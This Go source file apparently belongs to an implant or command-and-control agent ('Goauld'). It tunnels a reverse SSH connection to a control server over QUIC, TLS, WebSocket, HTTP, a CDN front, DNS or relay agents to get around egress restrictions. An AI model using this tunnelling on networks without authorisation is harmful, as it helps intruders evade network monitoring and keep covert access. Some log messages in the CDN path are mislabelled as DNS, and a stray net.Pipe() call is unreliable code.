// Package ssh holds the agent client SSH to connect to the server
package ssh

import (
	"Goauld/agent/ssh/transport/darkflare"
	"Goauld/agent/ssh/transport/http"
	"context"
	"errors"
	"io"
	"net"
	"strings"
	"time"

	"Goauld/agent/config"
	"Goauld/agent/ssh/transport"
	"Goauld/common/log"

	"golang.org/x/crypto/ssh"
)

// getProxiedClient return a connected SSH client
// This client may be proxies (TLS, Websocket, HTTP), or not, depending on the egress restrictions
// The order of the connection attempt is defined in the agent configuration.
func getProxiedClient(ctx context.Context, sshConfig *ssh.ClientConfig, dnsTransport *transport.DNSSH, id string) (*ssh.Client, net.Conn, io.Closer, string, error) {
	var client *ssh.Client
	var conn net.Conn
	var closer io.Closer
	for _, proto := range config.Get().GetRSSHOrder() {
		log.Info().Str("Mode", proto).Dur("Timeout", config.Get().GetSSHTimeout()).Msg("Connecting to ssh")
		timeoutCtx, cancel := context.WithTimeout(ctx, config.Get().GetSSHTimeout())
		resultChan := make(chan string, 1)
		go func() {
			switch {
			case strings.HasPrefix(proto, "ssh"):
				client = directSSH(timeoutCtx, sshConfig)
				if client != nil {
					closer = client
					resultChan <- "SSH"
				} else {
					cancel()
				}

			case strings.HasPrefix(proto, "quic"):
				_client, stream := proxyQuic(timeoutCtx, sshConfig, id)
				if _client != nil {
					client = _client
					closer = stream
					conn = stream
					resultChan <- "QUIC"
				} else {
					cancel()
				}
			case strings.HasPrefix(proto, "tls"):
				client, conn = proxyTLS(timeoutCtx, sshConfig, id)
				if client != nil {
					closer = conn
					resultChan <- "TLS"
				} else {
					cancel()
				}

			case strings.HasPrefix(proto, "ws"):
				client, conn = proxyWS(timeoutCtx, ctx, sshConfig, id)
				if client != nil {
					closer = conn
					resultChan <- "WS"
				} else {
					cancel()
				}

			case strings.HasPrefix(proto, "http"):
				c, ssHTTP := proxyHTTP(sshConfig, id)
				client = c
				if client != nil {
					conn = ssHTTP.Stream
					closer = conn
					resultChan <- "HTTP"
				} else {
					_ = ssHTTP.Close()
					cancel()
				}
			case strings.HasPrefix(proto, "cdn"):
				c, ssHTTP := proxyDarkflare(ctx, sshConfig, id)
				client = c
				if client != nil {
					conn = ssHTTP
					closer = conn
					resultChan <- "CDN"
				} else {
					if ssHTTP != nil {
						_ = ssHTTP.Close()
					}
					cancel()
				}
			case strings.HasPrefix(proto, "dns"):
				if dnsTransport != nil {
					client, conn = proxyDNS(sshConfig, dnsTransport, id)
					if client != nil {
						closer = conn
						resultChan <- "DNS"
					} else {
						cancel()
					}
				}
			case strings.HasPrefix(proto, "relay"):
				client = relaySSH(timeoutCtx, sshConfig, config.Get().Relay())
				if client != nil {
					closer = client
					resultChan <- "SSH"
				} else {
					cancel()
				}
			}
		}()

		select {
		case mode := <-resultChan:
			return client, conn, closer, mode, nil
		case <-timeoutCtx.Done():
			log.Warn().Str("Mode", proto).Msg("Connection timed out, trying next...")
			cancel()

			continue
		}
	}

	return nil, nil, nil, "", errors.New("failed to Proxify ssh connection")
}

// directSSH perform a direct ssh connection to the SSHD server.
func directSSH(ctx context.Context, sshConfig *ssh.ClientConfig) *ssh.Client {
	log.Info().Str("Target", config.Get().ControlSSHServer()).Msgf("Trying to direct connect to ssh server")
	client, err := transport.DirectSSHConnect(ctx, sshConfig)
	if err != nil {
		log.Error().Err(err).Msg("Failed to connect directly to ssh server")

		return nil
	}
	log.Info().Msgf("Direct connection to the ssh server successfully")

	return client
}

// relaySSH perform aa ssh connection to the SSHD server through a relay agent.
func relaySSH(ctx context.Context, sshConfig *ssh.ClientConfig, relay string) *ssh.Client {
	log.Info().Str("Target", config.Get().ControlSSHServer()).Str("Relay", relay).Msgf("Trying to connect to ssh server through relay agent")
	client, err := transport.SSHConnectOverRelay(ctx, sshConfig, relay)
	if err != nil {
		log.Error().Err(err).Msg("Failed to connect to ssh server using relay agent")

		return nil
	}
	log.Info().Msgf("Connection to the ssh server through relay agent successful")

	return client
}

// proxyTLS proxies the SSH traffic using a TLS connection to the server.
//
//nolint:dupl
func proxyTLS(ctx context.Context, sshConfig *ssh.ClientConfig, id string) (*ssh.Client, net.Conn) {
	log.Info().Str("Mode", "TLSSH").Str("Target", config.Get().TLSURL()).Msgf("Trying to proxify SSH using TLS")
	tlsConn, err := transport.GetTLSConn(ctx, id)
	if err != nil {
		log.Error().Str("Mode", "TLSSH").Err(err).Msg("Failed to create TLS connection")

		return nil, nil
	}
	log.Debug().Str("Mode", "TLSSH").Msg("Connection succeeded, trying to mount SSH over the TLS connection")
	client, err := tryProxySSH(sshConfig, tlsConn, id)
	if err != nil {
		log.Error().Str("Mode", "TLSSH").Err(err).Msg("Failed to proxy SSH over the TLS connection")

		return nil, nil
	}
	log.Info().Str("Mode", "TLSSH").Msg("Proxy using TLS succeeded")

	return client, tlsConn
}

// proxyQuic proxies the SSH traffic using a Quic connection to the server.
//
//nolint:dupl
func proxyQuic(ctx context.Context, sshConfig *ssh.ClientConfig, id string) (*ssh.Client, net.Conn) {
	log.Info().Str("Mode", "QUIC").Str("Target", config.Get().QuicURL()).Msgf("Trying to proxify SSH using Quic")
	stream, err := transport.GetQuicConn(ctx, id)
	if err != nil {
		log.Error().Str("Mode", "QUIC").Err(err).Msg("Failed to create Quic connection")

		return nil, nil
	}
	log.Debug().Str("Mode", "QUIC").Msg("Connection succeeded, trying to mount SSH over the Quic connection")
	client, err := tryProxySSH(sshConfig, stream, id)
	if err != nil {
		log.Error().Str("Mode", "QUIC").Err(err).Msg("Failed to proxy SSH over the Quic connection")

		return nil, nil
	}
	log.Info().Str("Mode", "QUIC").Msg("Proxy using Quic succeeded")

	return client, stream
}

// proxyWS proxies the SSH traffic using a websocket connection to the server.
func proxyWS(timeoutContext context.Context, globalContext context.Context, sshConfig *ssh.ClientConfig, id string) (*ssh.Client, net.Conn) {
	log.Info().Str("Mode", "WSSH").Str("Target", config.Get().WSshURL(id)).Msg("Trying to proxy SSH using websocket")
	wsConn, err := transport.GetWebsocketConn(timeoutContext, globalContext, id)
	if err != nil {
		log.Error().Str("Mode", "WSSH").Err(err).Msg("Failed to create WebSocket connection")

		return nil, nil
	}
	log.Debug().Str("Mode", "WSSH").Msg("Connection succeeded, trying to mount SSH over the Websocket connection")
	client, err := tryProxySSH(sshConfig, wsConn, id)
	if err != nil {
		log.Error().Str("Mode", "WSSH").Err(err).Msg("failed to proxy ssh connection using websocket")

		return nil, nil
	}
	log.Info().Str("Mode", "WSSH").Msg("Proxy using websocket succeeded")

	return client, wsConn
}

// proxyHTTP proxies the SSH traffic using an HTTP connection to the server.
func proxyHTTP(sshConfig *ssh.ClientConfig, id string) (*ssh.Client, *http.SSHTTP) {
	log.Info().Str("Mode", "SSHTTP").Str("Target", config.Get().SSHTTPURL(id)).Msg("Trying to proxy SSH using HTTP")
	httpConn, err := http.NewSSHTTP(config.Get().SSHTTPURL(id))
	// err := httpConn.Connect()
	if err != nil {
		log.Error().Str("Mode", "SSHTTP").Err(err).Msg("failed to proxy SSH using HTTP")

		return nil, httpConn
	}
	_, err = httpConn.Stream.Write([]byte(config.Get().ID))
	if err != nil {
		log.Error().Str("Mode", "SSHTTP").Err(err).Msg("failed to proxy SSH using HTTP")

		return nil, httpConn
	}
	log.Debug().Str("Mode", "SSHTTP").Msg("Connection succeeded, trying to mount SSH over the HTTP connection")
	client, err := tryProxySSH(sshConfig, httpConn.Stream, id)
	if err != nil {
		log.Error().Str("Mode", "SSHTTP").Err(err).Msg("failed to proxy ssh connection using HTTP")

		return nil, httpConn
	}
	log.Info().Str("Mode", "SSHTTP").Msg("Proxy using HTTP succeeded")

	return client, httpConn
}

// proxyDNS proxies the SSH traffic using a DNS connection to the server.
func proxyDNS(sshConfig *ssh.ClientConfig, dnsTransport *transport.DNSSH, id string) (*ssh.Client, net.Conn) {
	log.Debug().Str("Mode", "DNSSH").Str("Target", config.Get().DNSDomain()).Msg("Trying send agent ID over the DNS connection")
	// Write S tag to inform the incoming SSH traffic

	_, err := dnsTransport.SSHStream.Write([]byte(id))
	if err != nil {
		log.Error().Str("Mode", "DNSSH").Err(err).Msg("Failed to init SSH stream over DNS")

		return nil, nil
	}
	log.Debug().Str("Mode", "DNSSH").Msg("Trying to mount SSH over the DNS connection")
	// Write S tag to inform the incoming SSH traffic
	_, err = dnsTransport.SSHStream.Write([]byte{'S'})
	if err != nil {
		log.Error().Str("Mode", "DNSSH").Err(err).Msg("Failed to init SSH stream over DNS")

		return nil, nil
	}
	client, err := tryProxySSH(sshConfig, dnsTransport.SSHStream, id)
	if err != nil {
		log.Error().Str("Mode", "DNSSH").Err(err).Msg("failed to proxy ssh connection using DNS")

		return nil, nil
	}
	log.Info().Str("Mode", "DNSSH").Msg("Proxy using DNS succeeded")

	return client, dnsTransport.SSHStream
}

func proxyDarkflare(ctx context.Context, sshConfig *ssh.ClientConfig, id string) (*ssh.Client, net.Conn) {
	conn1, conn2 := net.Pipe()
	httpClient := darkflare.NewClient(
		config.Get().CDNURL(config.Get().ID),
		80,
		"http",
		config.Get().CDNURL(config.Get().ID),
		true,
		"",
		"",
		"",
		true,
	)
	go httpClient.HandleConnection(conn1, ctx)
	client, err := tryProxySSH(sshConfig, conn2, id)
	if err != nil {
		log.Error().Str("Mode", "DNSSH").Err(err).Msg("failed to proxy ssh connection using DNS")

		return nil, nil
	}
	log.Info().Str("Mode", "DNSSH").Msg("Proxy using DNS succeeded")

	return client, conn2
}

// tryProxySSH attempts to proxies the SSH connection using the provided net.Conn
// A 30-second timeout is used if the underlying connection hangs without being fully established
// or without failure.
func tryProxySSH(conf *ssh.ClientConfig, netConn net.Conn, id string) (*ssh.Client, error) {
	chanSuccess := make(chan *ssh.Client)
	chanErr := make(chan error)

	var err error
	net.Pipe()

	go func() {
		_conn, ch, req, _err := ssh.NewClientConn(netConn, config.Get().WSshURL(id), conf)
		if _err != nil {
			err = _err
			chanErr <- err

			return
		}
		chanSuccess <- ssh.NewClient(_conn, ch, req)
	}()

	select {
	case client := <-chanSuccess:
		return client, nil
	case err := <-chanErr:
		_ = netConn.Close()

		return nil, err
	case <-time.After(config.Get().GetSSHTimeout()):
		return nil, errors.New("timeout while proxying ssh")
	}
}
